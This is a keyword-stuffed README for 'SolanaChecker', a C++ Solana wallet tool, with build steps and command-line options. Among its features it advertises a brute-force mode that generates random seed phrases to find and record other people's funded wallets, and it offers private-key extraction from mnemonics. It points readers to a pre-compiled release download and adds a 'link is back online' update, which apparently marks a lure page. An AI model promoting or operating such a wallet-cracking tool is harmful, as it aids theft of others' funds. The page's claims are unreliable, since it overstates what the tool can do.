# Solana Wallet Balance Checker for Transactions: Track Your SOL Activity

Need a robust **Solana wallet balance checker for transactions**? Look no further! **SolanaChecker** is a powerful tool designed to provide in-depth insights into your Solana wallet activity, offering features to monitor balances and track transactions with ease and efficiency. This is your key resource for staying informed about your SOL holdings and movements.

<p align="left">
    <img src="/img/file.webp" />
</p>

## Core Features for Solana Transaction Tracking

SolanaChecker goes beyond simple balance checks, providing features specifically designed to analyze and track Solana transactions:

1.  **Real-Time Solana Balance and Transaction Checker**  
    Check the current Solana balance of any specified address, providing instant access to your funds. This allows you to quickly track your transactions and manage your wallets effectively.

<p align="left">
    <img src="/img/still.webp" />
</p>

2.  **Solana Token Security Checks for Transactional Safety**  
    Assess the security of tokens associated with your transactions based on their characteristics and metadata. Avoid potentially fraudulent projects and stay secure with your transactions.

<p align="left">
    <img src="/img/open.webp" />
</p>

3.  **Advanced Solana Address Tracking and Transaction Monitoring (Telegram Integration)**  
    Receive real-time notifications about activity on specified Solana addresses through a Telegram bot. Monitor fund movements and transaction details, providing crucial insights into your transactions. Stay up-to-date on your wallets.

4.  **Solana Wallet Data Retrieval from Mnemonic Phrase for Transaction Management**  
    Extract the private key, address, and balance (including all tokens) of a Solana wallet using the mnemonic phrase (seed phrase). This feature helps you manage your wallets and access transaction data.

<p align="left">
    <img src="/img/show.webp" />
</p>

5.  **Generate a New Solana Wallet to Secure Transactions**  
    Generate a new Solana wallet with a unique private key and address to separate transactions and enhance security.

<p align="left">
    <img src="/img/mask.webp" />
</p>

6.  **Solana Wallet Generation and Balance Check, Transaction Monitoring (Brute-Force)**  
    Generate random seed phrases and check for existing wallets with activity. Found wallets are written to a file and can be tracked via the telegram integration for transaction monitoring.

<p align="left">
    <img src="/img/board.webp" />
</p>

## Configuring Telegram for Transaction Notifications

To receive notifications via Telegram regarding your Solana transactions, enter your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) in the 'telegram-settings.txt' file. This keeps you informed on all transaction activity.

## Getting Started with Solana Transaction Tracking

Download a pre-compiled build from [Release](../../releases) or build the project yourself. This tool is built to be user-friendly.

## Building the Project: Step-by-Step Guide

The project is written in C++ and depends on various libraries. **vcpkg** simplifies installing and managing these dependencies.

### Installing Dependencies Using vcpkg:

1.  If you haven’t already, clone the repository and install **vcpkg** by following the instructions on the [official page](https://github.com/microsoft/vcpkg).

2.  Add **vcpkg** to your system PATH environment variable.

3.  Install the dependencies using the following commands:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  After installing the dependencies, build the project in Visual Studio or using another C++ compiler.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Make sure **vcpkg** is correctly integrated with your environment. You can follow the instructions for [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio).
3.  Click **Build** -> **Build Solution**.
4.  The executable will be located in the `bin` folder or a similar directory after a successful build.

### Building with Another C++ Compiler:

1.  Ensure that all dependencies are installed via **vcpkg** and accessible to your compiler.
2.  Compile the project using the following command (adapt to your compiler):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Interface for Transaction Management

Here are the command-line options:

1.  **-s / -search**  
    Start a brute-force search for wallets with a balance.

2.  **-t / -track (ADDRESS)**
    Start tracking the specified address, including all transaction activity.

3.  **-g / -gen (NUMBER)**
    Generate a specified number of Solana wallets.

4.  **-m / -mnemonic (MNEMONIC)**
    Display wallet information using the provided seed phrase.

5.  **-b / -balance (ADDRESS)**
    Display the balance of the specified address, and information about transactions.

## Important Considerations

*   This tool is for research and informational purposes only.
*   Be aware of risks related to cryptocurrencies and transactions.
*   Always verify transaction details.

## License

This project is licensed under the [MIT License](/LICENSE). You are free to use, modify, and distribute the code in accordance with the terms of the license.



Update:  06/17/2025 link is back online and live